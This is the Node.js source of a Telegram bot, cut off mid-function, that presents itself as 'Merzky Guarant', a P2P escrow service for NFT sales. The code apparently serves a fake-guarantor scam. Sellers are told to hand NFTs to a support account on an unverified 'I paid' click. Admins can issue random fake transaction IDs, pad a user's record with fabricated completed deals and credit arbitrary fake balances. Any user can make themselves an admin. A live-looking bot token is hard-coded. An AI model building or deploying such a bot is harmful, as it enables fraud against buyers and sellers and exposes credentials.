const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end('Bot is running!');
});
server.listen(process.env.PORT || 10000);

// ========== ТВОИ ДАННЫЕ ==========
const token = '8299332460:AAFGapsLP32-OECwv6pqDNXXhQPRBFdcw_E';
const supportUsername = 'merzky_support';
const botUsername = 'MerzkyGarant_bot';
const MASTER_ID = 8563923108;
let adminIds = [MASTER_ID];

const bot = new TelegramBot(token, { polling: true });

let deals = new Map();
let completedDeals = new Map();
let userBalances = new Map();
let userSessions = new Map();
let userRequisites = new Map();
let users = new Map();
let financeAdmins = [];

const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE));
            deals = new Map(data.deals || []);
            completedDeals = new Map(data.completedDeals || []);
            userBalances = new Map(data.userBalances || []);
            userRequisites = new Map(data.userRequisites || []);
            users = new Map(data.users || []);
            if (data.adminIds) {
                adminIds = data.adminIds;
                if (!adminIds.includes(MASTER_ID)) adminIds.push(MASTER_ID);
            }
            if (data.financeAdmins) financeAdmins = data.financeAdmins;
        }
    } catch (e) {}
}

function saveData() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            deals: Array.from(deals.entries()),
            completedDeals: Array.from(completedDeals.entries()),
            userBalances: Array.from(userBalances.entries()),
            userRequisites: Array.from(userRequisites.entries()),
            users: Array.from(users.entries()),
            adminIds,
            financeAdmins
        }, null, 2));
    } catch (e) {}
}

loadData();
setInterval(saveData, 5 * 60 * 1000);

function generateDealId() {
    return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function isAdmin(userId) {
    return adminIds.includes(userId);
}

function isMaster(userId) {
    return userId === MASTER_ID;
}

function canAddFinance(userId) {
    return isMaster(userId) || financeAdmins.includes(userId);
}

function getDealLink(dealId) {
    return `https://t.me/${botUsername}?start=deal_${dealId}`;
}

function getUserFromMention(mention) {
    const username = mention.replace('@', '');
    for (let [id, u] of users) if (u.username === username) return id;
    return null;
}

function getMainMenu() {
    return { reply_markup: { keyboard: [
        [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
        [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
        [{ text: '📞 Поддержка' }]
    ], resize_keyboard: true }};
}

function getCurrencyMenu() {
    return { reply_markup: { inline_keyboard: [
        [{ text: '💎 TON', callback_data: 'curr_ton' }],
        [{ text: '💵 USDT', callback_data: 'curr_usdt' }],
        [{ text: '⭐ Stars', callback_data: 'curr_stars' }],
        [{ text: '💳 Карты', callback_data: 'show_cards' }]
    ]}};
}

function getCardsMenu() {
    return { reply_markup: { inline_keyboard: [
        [{ text: '🇷🇺 RUB (Россия)', callback_data: 'curr_rub' }],
        [{ text: '🇺🇦 UAH (Украина)', callback_data: 'curr_uah' }],
        [{ text: '🇰🇿 KZT (Казахстан)', callback_data: 'curr_kzt' }],
        [{ text: '🇪🇺 EUR (Европа)', callback_data: 'curr_eur' }],
        [{ text: '🇺🇸 USD (США)', callback_data: 'curr_usd' }],
        [{ text: '🇨🇳 CNY (Китай)', callback_data: 'curr_cny' }],
        [{ text: '🇦🇪 AED (ОАЭ)', callback_data: 'curr_aed' }],
        [{ text: '🇹🇷 TRY (Турция)', callback_data: 'curr_try' }],
        [{ text: '🇬🇧 GBP (Великобритания)', callback_data: 'curr_gbp' }],
        [{ text: '🇯🇵 JPY (Япония)', callback_data: 'curr_jpy' }],
        [{ text: '⬅️ Назад', callback_data: 'back_to_currencies' }]
    ]}};
}

// ========== СТАРТ ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    users.set(userId, { username: msg.from.username || 'no_username', first_name: msg.from.first_name });
    bot.sendMessage(chatId, '🚀 Merzky Guarant — P2P платформа\n\n🔹 Создайте сделку для продажи NFT\n🔹 Добавьте реквизиты для получения оплаты', getMainMenu());
});

// ========== СТАРТ С ПАРАМЕТРОМ (ПОКУПКА) ==========
bot.onText(/\/start deal_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const dealId = match[1];
    const deal = deals.get(dealId);
    if (!deal || deal.status !== 'pending') return bot.sendMessage(chatId, '❌ Сделка не найдена');
    bot.sendMessage(chatId, `🛒 Покупка NFT\n\n💰 Сумма: ${deal.amount} ${deal.currency}\n👤 Продавец: @${deal.sellerUsername}`, {
        reply_markup: { inline_keyboard: [[{ text: '💳 Купить', callback_data: `buy_${dealId}` }]] }
    });
});

// ========== МОИ РЕКВИЗИТЫ ==========
bot.onText(/💰 Мои реквизиты/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
    const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
    bot.sendMessage(chatId, `💳 Мои реквизиты\n\n💎 TON: ${req.ton || '❌'}\n💵 USDT: ${req.usdt || '❌'}\n💳 Карта: ${req.card || '❌'}`, {
        reply_markup: { inline_keyboard: [
            [{ text: `💎 TON ${req.ton ? '✅' : '❌'}`, callback_data: 'edit_ton' }],
            [{ text: `💵 USDT ${req.usdt ? '✅' : '❌'}`, callback_data: 'edit_usdt' }],
            [{ text: `💳 Карта ${req.card ? '✅' : '❌'}`, callback_data: 'edit_card' }],
            [{ text: '◀️ Назад', callback_data: 'back_main' }]
        ]}
    });
});

// ========== СОЗДАТЬ СДЕЛКУ ==========
bot.onText(/➕ Создать сделку/, async (msg) => {
    const chatId = msg.chat.id;
    try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
    bot.sendMessage(chatId, '💎 Выберите валюту:', getCurrencyMenu());
});

// ========== МОИ СДЕЛКИ ==========
bot.onText(/📋 Мои сделки/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const active = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    const completed = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    if (!active.length && !completed.length) return bot.sendMessage(chatId, '📭 У вас нет сделок');
    let text = '📋 Ваши сделки:\n\n';
    if (active.length) text += 'Активные:\n' + active.map(d => `🔹 #${d.id} — ${d.amount} ${d.currency}`).join('\n') + '\n\n';
    if (completed.length) text += 'Завершённые:\n' + completed.slice(0,5).map(d => `✅ #${d.id} — ${d.amount} ${d.currency}`).join('\n');
    bot.sendMessage(chatId, text);
});

// ========== ПРОФИЛЬ ==========
bot.onText(/👤 Профиль/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const completedCount = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId).length;
    bot.sendMessage(chatId, `👤 Профиль\n\n🆔 ID: ${userId}\n📊 Сделок: ${completedCount}`, getMainMenu());
});

// ========== ПОДДЕРЖКА ==========
bot.onText(/📞 Поддержка/, (msg) => bot.sendMessage(msg.chat.id, `📞 @${supportUsername}`));

// ========== ОБРАБОТКА КНОПОК ==========
bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id;
    const msgId = q.message.message_id;
    const userId = q.from.id;
    const data = q.data;

    try {
        if (data === 'edit_ton') {
            userSessions.set(userId, { step: 'waiting_ton' });
            await bot.editMessageText('✏️ Отправьте новый TON кошелек:', { chat_id: chatId, message_id: msgId });
        }
        else if (data === 'edit_usdt') {
            userSessions.set(userId, { step: 'waiting_usdt' });
            await bot.editMessageText('✏️ Отправьте новый USDT адрес:', { chat_id: chatId, message_id: msgId });
        }
        else if (data === 'edit_card') {
            userSessions.set(userId, { step: 'waiting_card' });
            await bot.editMessageText('✏️ Отправьте новые данные карты:', { chat_id: chatId, message_id: msgId });
        }
        else if (data === 'back_main') {
            await bot.deleteMessage(chatId, msgId);
            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
        }
        else if (data === 'show_cards') {
            await bot.editMessageText('💳 Выберите валюту карты:', {
                chat_id: chatId,
                message_id: msgId,
                reply_markup: getCardsMenu().reply_markup
            });
        }
        else if (data === 'back_to_currencies') {
            await bot.editMessageText('💎 Выберите валюту:', {
                chat_id: chatId,
                message_id: msgId,
                reply_markup: getCurrencyMenu().reply_markup
            });
        }
        else if (data.startsWith('curr_')) {
            const currency = data.split('_')[1];
            const req = userRequisites.get(userId);
            
            if (['rub', 'uah', 'kzt', 'eur', 'usd', 'cny', 'aed', 'try', 'gbp', 'jpy'].includes(currency)) {
                if (!req || !req.card) {
                    return bot.answerCallbackQuery(q.id, '❌ Сначала добавьте карту в реквизитах');
                }
            } else if (currency !== 'stars') {
                if (!req || !req[currency]) {
                    return bot.answerCallbackQuery(q.id, '❌ Сначала добавьте реквизиты');
                }
            }
            
            userSessions.set(userId, { step: 'waiting_nft', currency, messageId: msgId });
            await bot.editMessageText('📎 Отправьте ссылку на NFT:', { chat_id: chatId, message_id: msgId });
        }
        else if (data.startsWith('buy_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            if (!deal || deal.status !== 'pending') return bot.answerCallbackQuery(q.id, '❌ Сделка не найдена');
            const req = userRequisites.get(deal.sellerId) || {};
            let reqText = '';
            if (deal.currency === 'ton' && req.ton) reqText = `💎 TON: ${req.ton}`;
            else if (deal.currency === 'usdt' && req.usdt) reqText = `💵 USDT: ${req.usdt}`;
            else if (['rub', 'uah', 'kzt', 'eur', 'usd', 'cny', 'aed', 'try', 'gbp', 'jpy'].includes(deal.currency) && req.card) {
                reqText = `💳 Карта (${deal.currency.toUpperCase()}): ${req.card}`;
            } else if (deal.currency === 'stars') reqText = `⭐ Отправьте подарок @${supportUsername}`;
            else reqText = '❌ У продавца нет реквизитов';
            
            await bot.sendMessage(chatId, `💳 Оплата сделки #${dealId}\n\n💰 Сумма: ${deal.amount} ${deal.currency}\n👤 Продавец: @${deal.sellerUsername}\n\n📩 Реквизиты:\n${reqText}`, {
                reply_markup: { inline_keyboard: [[{ text: '✅ Я оплатил', callback_data: `paid_${dealId}` }]] }
            });
            bot.answerCallbackQuery(q.id);
        }
        else if (data.startsWith('paid_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            if (!deal || deal.status !== 'pending') return bot.answerCallbackQuery(q.id, '❌ Сделка не найдена');
            deal.status = 'paid';
            deal.buyerId = userId;
            deal.buyerUsername = q.from.username || 'no_username';
            deals.set(dealId, deal);
            saveData();
            await bot.sendMessage(deal.sellerId, `💰 Сделка #${dealId} оплачена!\n\n✅ Отправьте NFT в поддержку @${supportUsername}`, {
                reply_markup: { inline_keyboard: [[{ text: '✅ NFT отправлен', callback_data: `sent_${dealId}` }]] }
            });
            await bot.editMessageText('✅ Заявка отправлена продавцу!', { chat_id: chatId, message_id: msgId });
            bot.answerCallbackQuery(q.id);
        }
        else if (data.startsWith('sent_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            if (!deal) return bot.answerCallbackQuery(q.id, '❌ Сделка не найдена');
            adminIds.forEach(async (adminId) => {
                if (adminId === userId) return;
                await bot.sendMessage(adminId, `📦 NFT отправлен в поддержку!\n\nСделка #${dealId}\nПродавец: @${deal.sellerUsername}\nПокупатель: @${deal.buyerUsername}\nСумма: ${deal.amount} ${deal.currency}`, {
                    reply_markup: { inline_keyboard: [[
                        { text: '✅ Подтвердить', callback_data: `confirm_${dealId}` },
                        { text: '❌ Отклонить', callback_data: `reject_${dealId}` }
                    ]]}
                });
            });
            bot.answerCallbackQuery(q.id, '✅ Уведомление отправлено админам');
        }
        else if (data.startsWith('confirm_')) {
            if (!isAdmin(userId)) return bot.answerCallbackQuery(q.id, '❌ Только для админов');
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            if (!deal) return;
            deal.status = 'completed';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            
            if (!userBalances.has(deal.sellerId)) userBalances.set(deal.sellerId, {});
            const sellerBalance = userBalances.get(deal.sellerId);
            const currencyKey = deal.currency.toLowerCase();
            sellerBalance[currencyKey] = (sellerBalance[currencyKey] || 0) + deal.amount;
            userBalances.set(deal.sellerId, sellerBalance);
            
            saveData();
            await bot.sendMessage(deal.sellerId, `✅ Сделка #${dealId} завершена!\n💰 ${deal.amount} ${deal.currency} зачислены.`);
            await bot.sendMessage(deal.buyerId, `✅ NFT получен!\nСделка #${dealId}\nTxID: 0x${Math.random().toString(36).substring(2,15)}`);
            await bot.editMessageText('✅ ПОДТВЕРЖДЕНО', { chat_id: chatId, message_id: msgId });
            bot.answerCallbackQuery(q.id);
        }
        else if (data.startsWith('reject_')) {
            if (!isAdmin(userId)) return bot.answerCallbackQuery(q.id, '❌ Только для админов');
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            if (!deal) return;
            deal.status = 'cancelled';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            saveData();
            await bot.sendMessage(deal.buyerId, `❌ Сделка #${dealId} отклонена`);
            await bot.editMessageText('❌ ОТКЛОНЕНО', { chat_id: chatId, message_id: msgId });
            bot.answerCallbackQuery(q.id);
        }
        bot.answerCallbackQuery(q.id);
    } catch (e) { console.error(e); bot.answerCallbackQuery(q.id, '❌ Ошибка'); }
});

// ========== ТЕКСТ ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    if (text?.startsWith('/') || ['➕ Создать сделку', '💰 Мои реквизиты', '📋 Мои сделки', '👤 Профиль', '📞 Поддержка'].includes(text)) return;

    const session = userSessions.get(userId);
    if (!session) return;

    if (session.step === 'waiting_ton') {
        const req = userRequisites.get(userId) || {};
        req.ton = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ TON кошелек сохранён!', getMainMenu());
    }
    if (session.step === 'waiting_usdt') {
        const req = userRequisites.get(userId) || {};
        req.usdt = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ USDT адрес сохранён!', getMainMenu());
    }
    if (session.step === 'waiting_card') {
        const req = userRequisites.get(userId) || {};
        req.card = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
    }
    if (session.step === 'waiting_nft') {
        if (!text.includes('t.me/') && !text.includes('http')) return bot.sendMessage(chatId, '❌ Отправьте ссылку на NFT');
        session.nftLink = text;
        session.step = 'waiting_amount';
        userSessions.set(userId, session);
        try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
        try { await bot.editMessageText('💰 Введите сумму:', { chat_id: chatId, message_id: session.messageId });
        } catch { await bot.sendMessage(chatId, '💰 Введите сумму:'); }
    }
    else if (session.step === 'waiting_amount') {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Введите корректное число');
        const dealId = generateDealId();
        const deal = {
            id: dealId,
            sellerId: userId,
            sellerUsername: msg.from.username || 'no_username',
            nftLink: session.nftLink,
            amount,
            currency: session.currency,
            status: 'pending',
            createdAt: new Date().toISOString()
        };
        deals.set(dealId, deal);
        saveData();
        const link = getDealLink(dealId);
        try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
        try { await bot.editMessageText(`✅ Сделка создана!\n\n#${dealId}\n💰 ${amount} ${session.currency}\n\n🔗 Ссылка для покупателя:\n${link}`, { chat_id: chatId, message_id: session.messageId });
        } catch { await bot.sendMessage(chatId, `✅ Сделка создана!\n\n#${dealId}\n💰 ${amount} ${session.currency}\n\n🔗 Ссылка:\n${link}`); }
        userSessions.delete(userId);
    }
});

// ========== ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ ==========

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    let text = "🔍 *Доступные команды:*\n\n";
    text += "• /start - Главное меню\n";
    text += "• /merzkyteam - Стать админом\n";
    text += "• /balance - Мой баланс TON\n";
    text += "• /allbalance - Все валюты\n";
    text += "• /profile - Мой профиль\n";
    text += "• /deals - Мои сделки\n";
    text += "• /help - Это сообщение\n\n";
    
    if (canAddFinance(msg.from.id)) {
        text += "💰 *Команды начисления:*\n";
        text += "• /addstars @user 100 - Начислить Stars\n";
        text += "• /addusdt @user 50 - Начислить USDT\n";
        text += "• /addcurr @user 500 RUB - Начислить любую валюту\n";
        text += "• /removecurr @user 500 RUB - Снять валюту\n";
        text += "• /allbalance - Показать все валюты\n\n";
    }
    
    if (isAdmin(msg.from.id)) {
        text += "👑 *Команды админа:*\n";
        text += "• /stats - Статистика бота\n";
        text += "• /clear - Очистить чат\n\n";
    }
    
    if (isMaster(msg.from.id)) {
        text += "👑 *Команды мастера:*\n";
        text += "• /addbalance @user 100 - Добавить TON\n";
        text += "• /setbalance @user 500 - Установить TON\n";
        text += "• /addadmin @user - Добавить админа\n";
        text += "• /removeadmin @user - Удалить админа\n";
        text += "• /adminlist - Список админов\n";
        text += "• /addfake @user 10 - Накрутить сделки\n";
        text += "• /wipe @user - Сбросить пользователя\n";
        text += "• /stats - Статистика бота\n";
        text += "• /broadcast текст - Рассылка\n";
        text += "• /giveaccess @user - Дать доступ к начислениям\n";
        text += "• /accesslist - Список допущенных\n";
        text += "• /clearbalance @user - Очистить баланс\n";
        text += "• /clear - Очистить чат\n";
        text += "• /restart - Перезапустить бота\n";
    }
    
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    let balance = 0;
    
    if (userBalances.has(userId)) {
        const b = userBalances.get(userId);
        if (typeof b === 'number') balance = b;
        else if (b.ton) balance = b.ton;
    }
    
    bot.sendMessage(chatId, `💰 *Ваш баланс TON:* ${balance}`, { parse_mode: 'Markdown' });
});

// ========== ИСПРАВЛЕННЫЙ ALLBALANCE ==========
bot.onText(/\/allbalance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    let balanceText = `💰 *Ваш полный баланс:*\n\n`;
    let hasBalance = false;
    
    if (userBalances.has(userId)) {
        const b = userBalances.get(userId);
        
        if (typeof b === 'object' && !Array.isArray(b)) {
            const currencyMap = {
                'stars': { name: 'STARS', emoji: '⭐' },
                'usdt': { name: 'USDT', emoji: '💵' },
                'ton': { name: 'TON', emoji: '💎' },
                'rub': { name: 'RUB', emoji: '🇷🇺' },
                'uah': { name: 'UAH', emoji: '🇺🇦' },
                'kzt': { name: 'KZT', emoji: '🇰🇿' },
                'eur': { name: 'EUR', emoji: '🇪🇺' },
                'usd': { name: 'USD', emoji: '💵' },
                'cny': { name: 'CNY', emoji: '🇨🇳' },
                'aed': { name: 'AED', emoji: '🇦🇪' },
                'try': { name: 'TRY', emoji: '🇹🇷' },
                'gbp': { name: 'GBP', emoji: '🇬🇧' },
                'jpy': { name: 'JPY', emoji: '🇯🇵' }
            };
            
            for (let [key, value] of Object.entries(b)) {
                const lowerKey = key.toLowerCase();
                if (value && value > 0) {
                    if (currencyMap[lowerKey]) {
                        balanceText += `${currencyMap[lowerKey].emoji} ${currencyMap[lowerKey].name}: ${value}\n`;
                    } else {
                        balanceText += `💰 ${key.toUpperCase()}: ${value}\n`;
                    }
                    hasBalance = true;
                }
            }
        } else if (typeof b === 'number' && b > 0) {
            balanceText += `💎 TON: ${b}\n`;
            hasBalance = true;
        }
    }
    
    if (!hasBalance) {
        balanceText += `✨ У вас пока нет баланса\n\n`;
        balanceText += `Начисляйте валюту командами:\n`;
        balanceText += `• /addstars @user 100\n`;
        balanceText += `• /addusdt @user 50\n`;
        balanceText += `• /addcurr @user 500 RUB`;
    }
    
    bot.sendMessage(chatId, balanceText, { parse_mode: 'Markdown' });
});

bot.onText(/\/profile/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const completedCount = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId).length;
    const activeCount = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId).length;
    
    bot.sendMessage(chatId, 
        `👤 *Профиль*\n\n` +
        `🆔 ID: \`${userId}\`\n` +
        `📛 Username: @${msg.from.username || 'нет'}\n` +
        `📊 Всего сделок: ${completedCount}\n` +
        `⏳ Активных: ${activeCount}\n` +
        `👑 Статус: ${isMaster(userId) ? 'СОЗДАТЕЛЬ' : isAdmin(userId) ? 'АДМИН' : canAddFinance(userId) ? 'ФИНАНСЫ' : 'ПОЛЬЗОВАТЕЛЬ'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/deals/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const userDeals = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    const userCompleted = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    
    if (userDeals.length === 0 && userCompleted.length === 0) {
        return bot.sendMessage(chatId, '📭 У вас нет сделок');
    }
    
    let text = '📋 *Ваши сделки:*\n\n';
    
    if (userDeals.length > 0) {
        text += '*Активные:*\n';
        userDeals.forEach(deal => {
            const role = deal.sellerId === userId ? 'Продавец' : 'Покупатель';
            text += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} (${role})\n`;
        });
        text += '\n';
    }
    
    if (userCompleted.length > 0) {
        text += '*Завершённые (последние 5):*\n';
        userCompleted.slice(-5).forEach(deal => {
            text += `✅ #${deal.id} — ${deal.amount} ${deal.currency}\n`;
        });
    }
    
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, (msg) => {
    if (!isMaster(msg.from.id) && !isAdmin(msg.from.id)) return;
    
    const totalUsers = users.size;
    const totalDeals = deals.size + completedDeals.size;
    const activeDeals = deals.size;
    const completedDealsCount = completedDeals.size;
    
    bot.sendMessage(msg.chat.id,
        `📊 *Статистика бота*\n\n` +
        `👥 Пользователей: ${totalUsers}\n` +
        `📦 Всего сделок: ${totalDeals}\n` +
        `⏳ Активных: ${activeDeals}\n` +
        `✅ Завершено: ${completedDealsCount}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/broadcast (.+)/, (msg, match) => {
    if (!isMaster(msg.from.id)) return;
    
    const text = match[1];
    let sent = 0;
    let failed = 0;
    
    users.forEach((userData, userId) => {
        try {
            bot.sendMessage(userId, `📢 *Рассылка:*\n\n${text}`, { parse_mode: 'Markdown' });
            sent++;
        } catch {
            failed++;
        }
    });
    
    bot.sendMessage(msg.chat.id, `✅ Рассылка отправлена!\n👥 Получили: ${sent}\n❌ Не доставлено: ${failed}`);
});

bot.onText(/\/clear/, (msg) => {
    if (!isMaster(msg.from.id) && !isAdmin(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🧹 Функция очистки чата временно недоступна.');
});

bot.onText(/\/restart/, (msg) => {
    if (!isMaster(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🔄 Перезапуск бота...').then(() => process.exit());
});

// ========== АДМИН-КОМАНДЫ ==========
bot.onText(/\/merzkyteam/, (msg) => {
    if (!adminIds.includes(msg.from.id)) {
        adminIds.push(msg.from.id);
        saveData();
        bot.sendMessage(msg.chat.id, '✅ Вы добавлены в админы!');
    } else bot.sendMessage(msg.chat.id, '⚡ Вы уже админ');
});

bot.onText(/\/addbalance (.+) (\d+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    if (!userBalances.has(targetId)) userBalances.set(targetId, {});
    const b = userBalances.get(targetId);
    if (typeof b === 'object') {
        b.ton = (b.ton || 0) + parseInt(m[2]);
    } else {
        userBalances.set(targetId, { ton: parseInt(m[2]) });
    }
    saveData();
    bot.sendMessage(msg.chat.id, `✅ Добавлено ${m[2]} TON`);
})());

bot.onText(/\/setbalance (.+) (\d+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    userBalances.set(targetId, { ton: parseInt(m[2]) });
    saveData();
    bot.sendMessage(msg.chat.id, `✅ Баланс TON установлен`);
})());

bot.onText(/\/addadmin (.+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    if (!adminIds.includes(targetId)) {
        adminIds.push(targetId);
        saveData();
        bot.sendMessage(msg.chat.id, `✅ ${m[1]} теперь админ`);
    }
})());

bot.onText(/\/removeadmin (.+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId || targetId === MASTER_ID) return bot.sendMessage(msg.chat.id, '❌ Ошибка');
    adminIds = adminIds.filter(id => id !== targetId);
    saveData();
    bot.sendMessage(msg.chat.id, `✅ ${m[1]} больше не админ`);
})());

bot.onText(/\/adminlist/, (msg) => isMaster(msg.from.id) && (() => {
    let text = '👑 Админы:\n';
    adminIds.forEach(id => {
        const u = users.get(id);
        text += `\n• @${u?.username || 'unknown'} (${id})${id === MASTER_ID ? ' 👑' : ''}`;
    });
    bot.sendMessage(msg.chat.id, text);
})());

bot.onText(/\/addfake (.+) (\d+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    for (let i = 0; i < +m[2]; i++) {
        const fakeId = generateDealId();
        completedDeals.set(fakeId, {
            id: fakeId,
            sellerId: targetId,
            sellerUsername: m[1].replace('@',''),
            amount: Math.floor(Math.random() * 1000) + 100,
            currency: ['ton','usdt','stars','rub','uah','eur'][Math.floor(Math.random()*6)],
            status: 'completed',
            isFake: true
        });
    }
    saveData();
    bot.sendMessage(msg.chat.id, `✅ Накручено ${m[2]} сделок`);
})());

bot.onText(/\/wipe (.+)/, (msg, m) => isMaster(msg.from.id) && (() => {
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    userBalances.delete(targetId);
    userRequisites.delete(targetId);
    [...deals.entries()].forEach(([k,v]) => (v.sellerId === targetId || v.buyerId === targetId) && deals.delete(k));
    [...completedDeals.entries()].forEach(([k,v]) => (v.sellerId === targetId || v.buyerId === targetId) && completedDeals.delete(k));
    saveData();
    bot.sendMessage(msg.chat.id, `✅ Пользователь сброшен`);
})());

// ========== КОМАНДЫ ДЛЯ НАЧИСЛЕНИЙ ==========

bot.onText(/\/giveaccess (.+)/, (msg, m) => {
    if (!isMaster(msg.from.id)) return;
    
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    if (!financeAdmins.includes(targetId)) {
        financeAdmins.push(targetId);
        saveData();
        bot.sendMessage(msg.chat.id, `✅ ${m[1]} теперь может начислять валюты!`);
        bot.sendMessage(targetId, `💰 Вам выдан доступ к командам начисления!`);
    } else {
        bot.sendMessage(msg.chat.id, `⚡ ${m[1]} уже имеет доступ`);
    }
});

bot.onText(/\/addstars (.+) (\d+)/, (msg, m) => {
    if (!canAddFinance(msg.from.id)) return bot.sendMessage(msg.chat.id, '❌ У вас нет прав');
    
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    if (!userBalances.has(targetId)) userBalances.set(targetId, {});
    const userBalance = userBalances.get(targetId);
    userBalance.stars = (userBalance.stars || 0) + parseInt(m[2]);
    userBalances.set(targetId, userBalance);
    saveData();
    
    bot.sendMessage(msg.chat.id, `⭐ Начислено ${m[2]} Stars пользователю ${m[1]}`);
    bot.sendMessage(targetId, `⭐ Вам начислено ${m[2]} Stars!`);
});

bot.onText(/\/addusdt (.+) (\d+)/, (msg, m) => {
    if (!canAddFinance(msg.from.id)) return bot.sendMessage(msg.chat.id, '❌ У вас нет прав');
    
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    if (!userBalances.has(targetId)) userBalances.set(targetId, {});
    const userBalance = userBalances.get(targetId);
    userBalance.usdt = (userBalance.usdt || 0) + parseInt(m[2]);
    userBalances.set(targetId, userBalance);
    saveData();
    
    bot.sendMessage(msg.chat.id, `💵 Начислено ${m[2]} USDT пользователю ${m[1]}`);
    bot.sendMessage(targetId, `💵 Вам начислено ${m[2]} USDT!`);
});

bot.onText(/\/addcurr (.+) (\d+) ([A-Za-z]{2,4})/, (msg, m) => {
    if (!canAddFinance(msg.from.id)) return bot.sendMessage(msg.chat.id, '❌ У вас нет прав');
    
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    const amount = parseInt(m[2]);
    const currency = m[3].toUpperCase();
    const key = currency.toLowerCase();
    
    if (!userBalances.has(targetId)) userBalances.set(targetId, {});
    const userBalance = userBalances.get(targetId);
    userBalance[key] = (userBalance[key] || 0) + amount;
    userBalances.set(targetId, userBalance);
    saveData();
    
    const emoji = {
        'stars': '⭐', 'usdt': '💵', 'rub': '🇷🇺', 'uah': '🇺🇦',
        'cny': '🇨🇳', 'aed': '🇦🇪', 'eur': '🇪🇺', 'usd': '💵'
    }[key] || '💰';
    
    bot.sendMessage(msg.chat.id, `${emoji} Начислено ${amount} ${currency} пользователю ${m[1]}`);
    bot.sendMessage(targetId, `${emoji} Вам начислено ${amount} ${currency}!`);
});

bot.onText(/\/removecurr (.+) (\d+) ([A-Za-z]{2,4})/, (msg, m) => {
    if (!canAddFinance(msg.from.id)) return bot.sendMessage(msg.chat.id, '❌ У вас нет прав на снятие');
    
    const targetId = getUserFromMention(m[1]);
